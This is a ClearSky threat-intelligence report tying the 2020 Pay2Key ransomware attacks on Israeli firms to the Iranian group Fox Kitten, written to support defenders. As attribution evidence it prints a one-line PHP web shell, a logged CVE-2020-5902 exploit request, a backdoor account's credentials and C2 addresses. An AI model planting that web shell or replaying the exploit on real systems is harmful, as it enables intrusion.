Summary\n\nDuring the past four months a wave of cyber-attacks has been targeting Israeli companies. The attacks\n\nare conducted by different means and target a range of sectors. We estimate with medium to high\n\nconfidence that Pay2Key is a new operation conducted by Fox Kitten, an Iranian APT group that began\n\na new wave of attacks that entailed dozens of Israeli companies in July-August 2020.\n\n## Fox Kitten Timeline\n\n2017-2019 February 2020 June 2020\n\n - Fox Kitten First Campaign  - ClearSky: Fox Kitten report  - Attempts to sell victim's\n\n - Dargos: Parisite lead  - Citrix: New vulnerability access in underground\n\nused by the group forums\n\n                                         - FRPC unique token\n\nSeptember 2020 August 2020 July 2020\n\n - CISA report about Fox  - FBI Alert - Big F5  - First attempt to exploit F5\n\nKitten vulnerability is used by the vulnerability\n\ngroup\n\n                                            - citrix@kharpedar\n\nwebshell - first identifier\n\nDecember 2020\n\n - Fox Kitten 2 - Pay2Kitten\n\nFox Kitten operations during 2017-2020\n\nThe Pay2Key‘s ”Modus Operndi” was to execute a Ransomware attack, potentially to mislead the\n\nvictim. The attacker penetrates companies’ internal networks, encrypts servers and workstations,\n\nsteals and leaks information. Also, this actor conducts “supply chain attacks” by compromising\n\ncompanies using accessibility or information that was obtained in breached companies. During\n\nOctober and November, we observed a wave of cyber-attacks on industrial and insurance companies.\n\nIn November we observed a new wave of attacks on logistics companies. This figure summarizes the\n\ntimeline of the Pay2Key campaign in Israel between June and December of 2020.\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\nDecember 2020\n\n - Fox Kitten 2 - Pay2Kitten\n\n\nSeptember 2020\n\n - CISA report about Fox\n\nKitten\n\n\nJune 2020\n\n - Attempts to sell victim's\n\naccess in underground\nforums\n\n - FRPC unique token\n\n\nAugust 2020\n\n - FBI Alert - Big F5\n\nvulnerability is used by the\ngroup\n\n\n-----\n\nPay2Key operations between June 2020 – December 2020\n\nWe believe that this campaign is part of the ongoing cyber confrontation between Israel and Iran, with\nthe most recent wave of attacks causing significant damage to some of the affected companies. The\nentry vector mostly consists of well-known vulnerabilities covered in our Fox Kitten reports throughout\nthe year. The attacks themselves or the abuse of successful attacks to compromise additional\n\ncompanies or service providers were conducted using obfuscating means, making the discovery of the\nattack more difficult.\n\nWe assess - with a medium level of confidence - that the Pay2Key campaign is aimed to create panic\nin Israel. The ransomware group pay2key publicly threatened Israel, this might indicate that this\noperation is only a propaganda campaign to cause fear and to divert attention from Fox Kitten. That\nwould explain the decision to leak the data instead of just demanding ransom. It can also explain why\n\nthis actor chose to leak the data via public social media platforms and to include threats directed at\n\nIsrael.\n\nDecember Darknet Leak site by Pay2Key\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nDecember Keybase Leak site by Pay2Keyleaks\n\nAs mentioned before, we attribute the campaign to Fox Kitten (corresponding report published in\nFebruary[1]) with a medium-high level of confidence.\n\n###### About Fox Kitten\n\nLast November, we located a malicious file that we associated with an Iranian operation that was\nnamed “Parisite” by Dragos. In February 2020 we exposed the Fox Kitten group, an Iranian campaign\nthat targeted companies in Israel and around the world using dozens of distinct tools. Organizational\nvulnerabilities are exploited to install multiple tools that will enable attackers to remotely connect to\nthe network and establish persistence for espionage and further infection (to other companies as well).\nIn August, the FBI published an alert regarding a new Fox Kitten capability. The group attacks a\nplethora of targets in various sectors around the world, including in Israel. The information that the\ngroup habitually exploits VPN vulnerabilities (such as Citrix or Fortinet) was familiar to ClearSky.\n\nOn September 15th, a CISA report regarding the Fox Kitten campaign was published with an FBI alert\nuncovering new vulnerability exploitations by the same campaign. The report adds confirmation to the\nprevious report published by ClearSky in February, providing additional evidence that the perpetrator\n\nwas an Iranian attacker.\n\nAn additional report was released on September 15th, concerning the various web shells installed on\n\nthe target network (as reviewed in the Fox Kitten report). A number of public WSs utilized by the group\nappeared in the report. The report also included FRPC configuration – FRP is a public remote\n\nconnection tool used by the group to create tunnels inside the attacked organization’s internal\n\nnetwork.\n\nAnalyzing the recent attacks conducted by the threat actor Pay2Key led us to the assess that there are\n\noverlaps between Fox Kitten to Pay2Key. In the following chapter, we examine the tool set used by\n\nPay2Key group and compare it to Fox Kitten tool set. In the last chapter of the report, we provide a\n\ndetailed comparison between the two groups based both on technical and thematic analysis.\n\n1 https://www.clearskysec.com/fox-kitten\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Tools Used by the Pay2Key and Their Similarities to Fox Kitten \n\nIn the recent ‘Pay2Key’ attacks in Israel, the group used a few malicious files to achieve their goals.\nMoreover, we were able to identify a number of methods that overlap with the tool set of Fox Kitten.\n\nThe different tools and techniques used by the group are divided in the following table into four types:\n\n1. Exploitation of vulnerabilities in VPN tools at the initial stage in the targeted organizations.\n\n2. Methods designed for privilege escalation, persistence and creating a tunnel for RDP\n\nconnections and information theft.\n\n3. Post-exploitation tools used for C2 server communication and data exfiltration, after the\n\nadversary has ensured its foothold on the target.\n\n4. Ransomware tool – Pay2Key ransomware.\n\n###### Tools and Offensive Techniques Categorized with MITRE ATT&CK\n\nThe following table shows the overlaps between the tools and techniques that we have found in the\noperation in comparison to the Fox Kitten group.\n\nKill Chain Phase Techniques, Title MITRE ATT&CK Fox Kitten Similarity\n\nTools and\n\nProcedures\n\nTechniques RDP Brute Force Brute Force - T1110           \nExploit Public-Facing\n\nTechniques ASP SQL injections           \nReconnaissance Application - T1190\n\nNetwork Service Fox Kitten identified\n\nProcedures Vulnerability scanning\nScanning - T1046 vulnerable servers\n\nFox Kitten used\n\nFortinet VPN\n\nvulnerability between\n\nCVE-2018-13379 2018-2020.

The attacker worked fast, succeeding to penetrate companies’\n\nnetworks by exploiting known vulnerabilities. The attitude of the group towards the victims is\n\nexceptionally “unprofessional”, as the attacker is overly cynical, mocks his victims and in several cases\n\ndi not hand over decryption keys after payment.\n\nIn this chapter we analyze the toolset of Pay2Key.\n\n###### TTPs\n\n Attacking Vector\n\nKeyBase – First sign of the campaign infrastructure\n\nIn June Pay2Key created their KeyBase account.\n\nThe first known Pay2Key ransomware executable compilation date is set to October 26[th], 2020. A day\n\nlater Pay2Key’s KeyBase account had a new key generated:\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nOn this same date Swascan published the first public report detailing the Pay2Key ransomware[2]. The\n\nreport describes attacks in Europe in which, the adversary had access to the systems a week prior to\nthe encryption, from October 20[th], 2020.\n\nInitial Entry\n\nThe attacker attempts to manually breach organizational systems by exploiting the following\nvulnerabilities or vulnerable products:\n\n   - Microsoft Exchange Server\n\n   - RDP vulnerabilities and brute forcing RDP server credentials\n\n   - VPN Vulnerabilities\n\nEstablishing a Backdoor Using Reverse Proxy\n\nWhen investigating one of the attacks, we identified that the attacker utilizes publicly available tools,\nsuch as FRPC[3] or Go Proxy[4], to enable Reverse Proxy[5] in an infected machine.\n\nThe configuration file accompanying the FRPC – Reverse Proxy tool was observed in one of the files\n\nuploaded for analysis and research. The organization’s name is encoded in the file:\n\n2 https://www.swascan.com/pay2key/\n3 github.com/fatedier/frp\n4 github.com/ffay/lanproxy\n5 en.wikipedia.org/wiki/Reverse_proxy\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nMoreover, we identified a version of LanProxy written in Go language. Its purpose is the same as the\n\nFRP, this file is used to open a reverse proxy between the compromised machine to the attacker’s C2.\n\nPay2Key Ransomware\n\nThe attacker’s methods of conducting lateral movement across the network and taking control of\nadditional servers and services is still unclear. However, we have noted that the attacker downloads\ntwo files to the path C:\\Windows\\Temp\\[organization-name]tmp\\ after obtaining initial access to the\n\norganizational network:\n\n   - The Pay2Key ransomware: Cobalt.Cobalt.exe\n\n   - The ransomware’s configuration file: Config.ini\n\nThe ransomware is written in C++. Exceptionally, as other ransomware groups encrypt their\n\nransomware files or at least obfuscate internal strings to make analysis more difficult, Pay2Key\nexecutable is unpacked and strings can be seen in clear text:\n\nThe debug data has been left in the executable enabling researchers to observe the ransomware’s\n\nstructure and navigate through its functionality. In several instances, the ransomware crashed or failed\n\nto decrypt the files after the victim paid the ransom.\n\nThe ransom message in the readme file states that all organization’s files have been encrypted,\n\ndemanding a ransom to release them, as it does in all ransomware attacks focused on extortion. If the\n\nransom is not delivered, the files and any information they contain will be leaked online.\n\nThe ransom itself ranged between seven and nine Bitcoin (with a few cases in which the attacker was\n\nnegotiated down to three Bitcoin). To pressure victims into paying, Pay2Key’s leak site displays\nsensitive information stolen from the target organizations and makes threats of further leaks if the\n\nvictims continue to delay payments.\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nFor more information about the Pay2Key ransomware, please check CheckPoint report[6].\n\nCommand and Control Server Architecture\n\nPay2Key can operate without being connected to its C2s. the ransomware depends on the C2 servers\nto receive information, such as the types of files it should encrypt, the organization’s name, the ransom\nmessage’s contents, and other details.\n\nThe ransomware receives the C2s’ IP addresses from its configuration file. In contrast to other\nransomware that usually connect to the C2 directly, Pay2Key initially connects to a single local\n\ncomputer in the organizational network and designates it to use Reverse Proxy services. This computer\n\nconstitutes an intersection between the target network and the C2 servers.\n\n###### Communication with Pay2Key and Data Leaks\n\nThe attacker registered in the Keybase.io service, which enables encrypted communications over the\n\ninternet and payments with the Stellar crypto currency. The attacker notably demands payments in\n\nBitcoin to other wallets despite being registered to a Stellar based platform.\n\nThe attacker opened his account in Keybase.io on June 28th, 2020. We believe that this is the date in\n\nwhich the initial preparations for the attacks began. This profile was then linked to communication\n\ndevices and a crypto wallet address by the attacker. At a certain stage of the process, the attacker\n\nadded the address of their leak site to their profile:\n\n6 https://research.checkpoint.com/2020/ransomware-alert-pay2key/\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nOn November 12nd 2020, CheckPoint published their second report regarding Pay2Key[7], the report\n\ndescribes the creation of a leak site for the Pay2Key ransomware. Ransomware leak sites are a recent\n\npopular trend, all the notoriously famous ransomware groups have one. The leak site of Pay2Key is\nanonymized and only accessible via TOR, but we believe it is hosted on AWS EC2 infrastructure.\n\nIn the beginning of the operation the leak site was very minimalistic, and it contains only files from\nIsraeli targets.\n\nEach of the compromised companies has a dedicated ransom note written by the Pay2Key operators.\nHere is an example for one of them:\n\nFrom the wording we can see the adversary is thoroughly inspecting the attacked asset prior to the\nencryption. Traditional ransomware groups do that as well in order to achieve maximum efficiency in\n\n7 https://research.checkpoint.com/2020/pay2key-the-plot-thickens/\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nthe operation so that the target would have to pay the ransom in order to restore normal operations.\nHowever, at the end of the message we can see that the adversary continued to control the network\neven after the encryption was completed and the ransom was paid.\n\n###### Previous Link to Iran\n\nCheck Point published an additional report following the attacker’s possible identity on November\n\n12th . Aided by Whitestream, Check Point surveilled the Bitcoin wallets that received ransom payments\nfrom victims. According to their joint research efforts, the currency was transferred to a mid-point\n\nwallet from which it was transferred again to a wallet associated with an Iranian crypto exchange\n\nnamed Excoino:\n\nThe research report notes that in order to register with the Excoino exchange, a user must provide an\nIranian phone number and Iranian identification means. This supports the assumption that the\nattacker (or multiple attackers) possesses an Iranian means of identification. CheckPoint state this as\n\nsufficient ground to attribute the attacks to Iran and identify the attackers as an Iranian attack group.\n\nIn our research, we identified that the name and image of the profile lead to a cryptography project\n\nnamed “EOSIO UTXO”. This project is also named Pay2Key and displays an identical profile image:\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nThe purpose of this project is to manufacture “smart contracts” based on the EOS crypto currency\nBlockchain.\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Pay2Key – December 2020\n\nAmital is an Israeli software company that was breached by this threat actor[8]. Leveraging Amital’s\nnetwork with a supply chain attack method, Pay2Key spread to over 40 firms from Israel.\n\nThe attacker used the same ransomware file from November and added several new tools to his tool\n\nset. In this chapter, we will examine the current attack by Pay2Key.\n\n###### Updated TTPs\n\n Exploitation\n\nThe analysis of the infrastructure of Habana identified a vulnerable Fortinet server that was breached\nand its credentials were leaked to an underground forum. This server was vulnerable to Fortinet SSL\nVPN (CVE-2018-13379)[9].\n\nWe assess that this server was hacked by the threat actor using this exploit.\n\n###### FRP\n\nBy monitoring this threat actor, we identified an FRPC tool, sharing the same IP address that was part\n\nof the December infrastructure according to the INDC alert and we attributed it to Fox Kitten. This file\nwas deployed to the victim’s network via another tool packed with MPRESS Packer. The deployed file\n“svchost.exe” is a compiled version of the FRP Client tool.\n\nAs in the previous FRPC file, the organization’s name is written:\n\n###### Persistency\n\nThis adversary created an account on the victim’s compromised asset with admin privileges. The\nattacker used the following credentials:\n\nUsername: DefaultAccounts$\n\nPassword: Kharpedar123!\n\n8 https://www.haaretz.com/israel-news/tech-news/.premium-iranian-hackers-hit-over-80-israeli-firms-as-massivecyberattack-continues-1.9375486\n9 https://twitter.com/Bank_Security/status/1331376128519528450/photo/1\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Command and Control Communication\n\nIn the Sawnscan report about Pay2Key[10], the company presented dllhost.exe as one of the applications\nused by the attack to be able to access the compromised asset. This file is a version of Ngrok software\nthat was hidden in the victim’s computer since the attacker hacked it.\n\n11\n\n###### Leaks\n\nIn Mid December 2020, Pay2Key changed the appearance of their leak site. The leak site now has a\nbackground image with the map of Israel. This was most likely done after the public announcement\nthat Intel Habana Labs were encrypted by Pay2Key. Habana Labs is an Israeli start-up that was\nacquired by Intel.\n\nThe current leak site has all the “official” ways Pay2Key communicate, mail, KeyBase and Twitter.\n\n10 https://www.swascan.com/pay2key/\n11 Source: Swascan report\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nUnlike the first wave, the Pay2Key attacker contacts its followers and the Israeli media via Twitter\naccount instead of a telegram channel.

In this chapter, we present\n\nan overview of these similarities and the overlaps between Pay2Key and Fox Kitten.\n\n###### Technological Similarites \n\n Exploitation and Local User\n\nIn the forensic research we conducted about the Fox Kitten campaign, we identified three main\n\nvulnerabilities that were exploited among the victims. Following this, further research by CISA, which\nis associated with the United States Department of Homeland Security, has revealed two additional\n\nvulnerabilities which are being used by the group[12]. We have witnessed attempts to exploit the CITRIX\nvulnerability in Israel since February 2020 and the Big F5 vulnerability since June 2020 (based on\ninformation we received from our partners). The following is the summary of vulnerabilities we\nattribute with high probability of being potentially exploited by the group:\n\n  - CVE-2019-11510 Pulse Secure\n\n  - CVE-2018-13379 Fortinet FortiOS\n\n  - CVE-2018-1579 Palo Alto Networks VPN\n\n  - CVE-2019-19781 Citrix NetScaler\n\n  - CVE-2020-5902 BIG-IP (F5 Networks)\n\nAdditionally, a password was presented as an indicator on the Israel National Cyber Directorate's\nreport:\n\nKharpedar123!\n\nThis password contains of two Persian words connected to each other. Khar meaning \"donkey\" and\n\nPedar meaning “father”. This is not a common expression in Persian, and it is used as a way of cursing.\n\nA similar expression in Persian is pedar-e sag (father's dog) which is usually used when referring to the\nUS and used for mockery purposes.\n\nIn our investigation, we identified utilization of this password, as mentioned before, in the victims’\n\nnetwork. This name was used as a password for a local user with high privileges, that the actor created\n\nin the victim’s machine. This method was executed by both Fox Kitten and Pay2Key, sharing the same\n\npassword for both.\n\n12 [https://us-cert.cisa.gov/sites/default/files/publications/AA20-259A-Iran-](https://us-cert.cisa.gov/sites/default/files/publications/AA20-259A-Iran-Based_Threat_Actor_Exploits_VPN_Vulnerabilities_S508C.pdf)\n[Based_Threat_Actor_Exploits_VPN_Vulnerabilities_S508C.pdf](https://us-cert.cisa.gov/sites/default/files/publications/AA20-259A-Iran-Based_Threat_Actor_Exploits_VPN_Vulnerabilities_S508C.pdf)\nhttps://www.zdnet.com/article/fbi-says-an-iranian-hacking-group-is-attacking-f5-networking-devices/\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nRIFT's report from July revealed that in the F5 vulnerability there was a use of a WebShell with a reused\npassword from the exploit of CITRIX vulnerability[13], which corresponds to the dates where the group\nexploited this vulnerability[14]:\n\n<?php @eval(base64_decode($_POST['citrix@kharpedar']));?>\n\nThis file has also been reported in the CISA report about the WebShell use by this group. This file was\nuploaded to VT from the US with three artifacts used by the threat actor to conduct this exploitation:\n\nAs can be seen, this is a reused web shell from Citrix used to exploit CVE-2019-19781 (Citrix NetScaler).\nIn the Fox Kitten report, we reported three main vulnerabilities the group used, and by February 2020,\nwe observed an exploitation of CVE-2019-19781 as well. In July, the FBI also reported[15] the exploitation\nof vulnerability in F5 networking devices. Therefore, we attribute the password “Kharpedar” to both\nCitrix and F5 exploitations, as well as the Pay2Key attack.\n\n###### Tool Set Overlaps\n\nBoth Fox Kitten and Pay2Key used two reverse proxy/SSH tools. In February, we reported that we\nobserved Fox Kitten utilize FRPC and Ngrok to open the tunnel between the compromised machines\n\nto the C2.\n\nAs mentioned before, Pay2Key also used Ngrok (according to swascan[16]). In our analysis, we also\nidentified an FRPC used by Pay2Key, which goes by the name dllhost.dll. This file shares the same\ntoken, as can be seen from the FRPC Token sub-chapter below. The malware that was used to deploy\nthe FRPC tool to the compromised asset is named “svchost.exe”. According to Intezer analysis[17], This\nfile (by Pay2Key) shares 97.47% of its genes with the same file name that Fox Kitten used in CISA report.\n\nBased on this file, we identified a PERL[18 ]reverse shell used by Fox Kitten, which also communicated\n\nwith Amazon hosted C2. The same Amazon server was observed serving the FRPC.EXE that was used\nin Pay2Key attacks.\n\n13 https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902intelligence /\n14 https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902intelligence/\n15 https://www.zdnet.com/article/fbi-says-an-iranian-hacking-group-is-attacking-f5-networking-devices/\n16 https://www.swascan.com/pay2key/\n17 [https://analyze.intezer.com/analyses/8ee2a089-7477-40a9-ad9f-4a9e34ba3cef](https://analyze.intezer.com/analyses/8ee2a089-7477-40a9-ad9f-4a9e34ba3cef)\nhttps://analyze.intezer.com/analyses/68c8f416-aad7-4257-aa5b-beaf42083ab8\n18 https://github.com/pentestmonkey/perl-reverse-shell\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nFRPC Token\n\nIn the first Fox Kitten report, we exposed the utilization of Fast Reverse Proxy (FRP) as one of the\nmethods Fox Kitten used during the three years of their operation. One of the tools they used in\nFebruary was FRPC[19], an open-source tool that enables the exposure of a local server behind a NAT or\n\na firewall to the internet, based on the reverse proxy method.\n\nIn CISA report about Fox Kitten’s WebShell, they also presented a version of the FRPC tool configuration\n\nused by this threat actor. The file name was dllhost.dll – same as the files we identified in Pay2Key\ncampaign. Here is the configuration file of the FRPC presented by CISA[20]:\n\nAs can be seen, this configuration shares the same token as the Pay2Key FRPC configuration:\n\nNote that the FRPC token was entered manually, indicating a single-value token[21]. Therefore, the\n\noverlap between the FRPC token of Fox Kitten and the FRPC token of Pay2Key is strong evidence of the\n\nconnection between the groups.\n\nSince FRP Clients need to connect to an FRP Server, the server token for both Pay2Key and Fox Kitten\n\nis the same.\n\n19 https://github.com/fatedier/frp\n20 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-259a\n21 https://github.com/fatedier/frp/blob/dev/conf/frps_full.ini\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\nAnother FRPC’s configuration used that includes this token was uploaded to VT in June 2020. This file\nalso has server_addr parameter, which point to the following IP address, hosted in Amazon cloud[22]:\n\n54.174.216[.]48\n\nA comment in VirusTotal[23] on this IP with logs of this server point to the aforementioned F5 report by\n\nNCC Group. This server was used in attempted exploitation of the F5 vulnerability (CVE-2020-5902):\n\n2020-07-06 16:07:55 /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp curl/7.58.0\n\nAlso, a similarity of the WebShell was identified. Here is a comparison between the logs and the F5\nreport by NCC Group[24]:\n\nThis exploitation attempt results in the creation of php WebShell with the citrix@kharpedar string.\n\nThus, we identified the same token used by Pay2Key in 2 different FRPC’s configuration, one of which\npoint to a C2 server that attempted to exploit a known vulnerability that Fox Kitten use (which also\nincludes the ‘Kharpedar’ phrase).\n\n###### Command and Control\n\nAs mentioned before, Fox Kitten used Amazon servers before, the same as Pay2Key. One of the servers\n\nwe identified in the attack at “Amital”, was attributed by us to Fox Kitten before it was embedded in\n\nPay2Key attack.\n\nIt is noteworthy to mention that according to the Israel National Cyber Directorate's report, there was\n\na use of a domain called tunnels4[.]me which is on the following IP address: 63.32.140[.]129. On this IP\naddress we have identified an updated domain which is allegedly impersonating 2Bsecure company.\n\nHowever, we do not have a way to associate this information with Fox Kitten's activity, except for the\nfact that the mentioned control server contains an option to connect with SSH:\n\n22 During our initial Fox Kitten analysis, we observed multiple Fox Kitten servers hosted in Amazon.\n23 https://www.virustotal.com/gui/ip-address/54.174.216.48/community\n24 https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902intelligence/\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Thematic Similarities\n\nWe believe that this attack was conducted by Fox Kitten. We have also identified an old user, named\nkharpedar that was active in a few sensitive forums and engaged with penetrating sensitive\norganizational networks. This user is now active under a different name in a few underground forums.\nIn one of these forums, the user has presented its new name with the following message, which makes\nus believe it is an Iranian attacker.\n\nIt is noteworthy to mention that other research companies with which we collaborate, also associate\nthis user with Fox Kitten. However, we would like to emphasize that we have no way of determining\nwhether the user was active independently on this forum or on behalf of the Iranian government,\nselling the data which was obtained by the group. In one of his declarations, he emphasizes that he\nhas accessibility to governmental organizations in Turkey, and in another declaration, he says that\nIndia is not an attractive destination for him. In addition, the breach to the holding company Raytheon\nis another indication (although weak) for the sector on which the Iranian APT33 group focuses.\n\n###### Timeline\n\nHere is a chart summarize the Fox Kitten and the Pay2Key timelines:\n\n2020 Fox Kitten Pay2Key\n\nFebruary ClearSky’s Fox Kitten report \nCitrix: New vulnerability used by the group\n\nJune Attempts to sell victims’ access in underground KeyBase account\n\nforums\n\nFirst attempt to exploit Big IP F5 vulnerability\n\n                                                                          citrix@kharpedar WebShell – first identifier\n\nAugust FBI Alert – Big F5 vulnerability is used by the group \nSeptember CISA report about Fox Kitten \nOctober First identified access to a vulnerable server\n\n                                - Ransomware compilation\n\nMalware execution on ‘Patient Zero’\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n|2020|Fox Kitten|Pay2Key|\n|---|---|---|\n|February|ClearSky’s Fox Kitten report Citrix: New vulnerability used by the group|-|\n|June|Attempts to sell victims’ access in underground forums|KeyBase account|\n|July|First attempt to exploit Big IP F5 vulnerability citrix@kharpedar WebShell – first identifier|-|\n|August|FBI Alert – Big F5 vulnerability is used by the group|-|\n|September|CISA report about Fox Kitten|-|\n|October|-|First identified access to a vulnerable server Ransomware compilation Malware execution on ‘Patient Zero’|\n\n\n-----\n\n|Col1|Col2|Swascan public report|\n|---|---|---|\n|November|-|First wave of attacks in Israel – Leaking information via TOR site|\n|December|-|Second wave of attacks in Israel Compromising multiple companies (Supply Chain attack) Leaking via Twitter Visual change on leak site|\n\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\n###### Recommendations and Insights\n\nThis report reveals a strong connection between two groups that were formerly considered to be\nseparate units. In recent months, several reports dealing with tools common to pay2key and Fox Kitten\n\nwere published. The report shows a direct link between pay2key ransomware attacks which all had\n\nFox Kitten tools used in them.\n\n###### The Attackers\n\n  - The Iranian offensive establishment has reached the level of knowledge and flexibility which\n\nallows it to use “1 Day” vulnerabilities, i.e. development and distribution of malware using\n\npublicly revealed vulnerabilities, in a period of hours to days since their publication.\n\n  - We assess that Pay2Key, or Fox Kitten, understands that a direct attack on defense systems is\nmuch more difficult than infiltration using VPN systems that bring you directly to the target’s\ncore systems, and that this method is also much more cost effective.\n\n  - The ransom demand is low compared to other known ransomware gangs; this is an incentive\nto pay the cheap ransom. The ransom is most likely just a bonus, since the group’s main\nmotivation so far is espionage.\n\n  - We suspect that not all Fox Kitten targets were encrypted with ransomware, in some data was\nonly exfiltrated. We assess that one of the options is the ransomware was applied to targets\nthat are not the focus of Fox Kitten, while the main targets were left unencrypted in order to\n\nkeep the attack covert.\n\n  - We also suspect that the adversary engages in RDP brute force attacks as well as SQL injections\n\non ASP systems. This is because they run on Microsoft Windows systems, which is the only\noperating system in which the attacker has been observed doing a lateral movement across\nthe organization.\n\n###### The Attack Infrastructure\n\n  - VPN systems which allow remote access to corporate systems comprise a significant risk,\nbecause they essentially bypass all defense systems deployed vis-à-vis the internet. Review\nand assessment are needed in order to understand whether the systems are controlled and\nmonitored completely by the organization.\n\n  - The adversary has used the password “kharpedar” in the web shells and in the local windows\n\naccounts they created for persistence and lateral movement. It means that the attacker first\n\ngained initial foothold access and then escalating privileges and moving latterly across the\n\norganization to get to the AD. Monitoring local users and privileges in the organization is\n\nessential for identifying unwanted users within the network.\n\n  - The attackers have used AWS EC2 infrastructure to carry their attacks, it is strongly advised to\n\naudit all incoming connections from AWS EC2 to your organization to make sure all the\n\n____________________________________________________________________________________________________\n\n**© All rights reserved to ClearSky Cyber Security ltd. 2020**\n**[info@clearskysec.com](mailto:info@clearskysec.com)** **[www.clearskysec.com](http://www.clearskysec.com/)**\n\n**TLP:White**\n\n\n-----\n\naddresses are known to you, as one of those possible addresses might be in use by the\nadversary.\n\n  - The recommended timeframe to install a security patch after the vulnerability has been\npublished has shortened and we assess it to be between 24 hours and a week between the\n\nvulnerability’s publication and the moment it becomes a real threat for the organization. This\ncan be seen in the F5 exploitation attempts in the NCC report.\n\n  - Checking outward facing systems, including different VPN systems, is critically important for\n\nthe company. There is a need for constant monitoring, making sure that the systems are\n\nconstantly updated, and preventing unneeded exposure of the administration interfaces to\n\nthe outside world. Constantly check for security updates to VPN systems.\n\n  - After each update performed on core corporate systems, including VPN systems, it is\nrecommended to reset all passwords to all end users in the organization and to oblige all users\nto re-connect to the services, in order to identify unwanted connections.\n\n  - It is highly recommended to create a two-step authentication to the corporate core systems\nVPN access.\n\n  - It is recommended to use VPN services that keep logs on a different media (preferably nonerasable) during communication.\n\n  - Users permission’s and active users on each station should be monitored constantly. In this\ncampaign, the attackers have created, multiple times, local users that allowed them to act\n\nfreely.\n\n  - If your organization possesses one of the affected software it is highly recommended to\n[perform a full reset of the AD forest as described here](https://us-cert.cisa.gov/ncas/alerts/aa20-283a) under “Comprehensive Account Resets”\nsection.\n\n###### • The attack infrastructure attached to this report should be monitored and blocked.\n\nRecommended 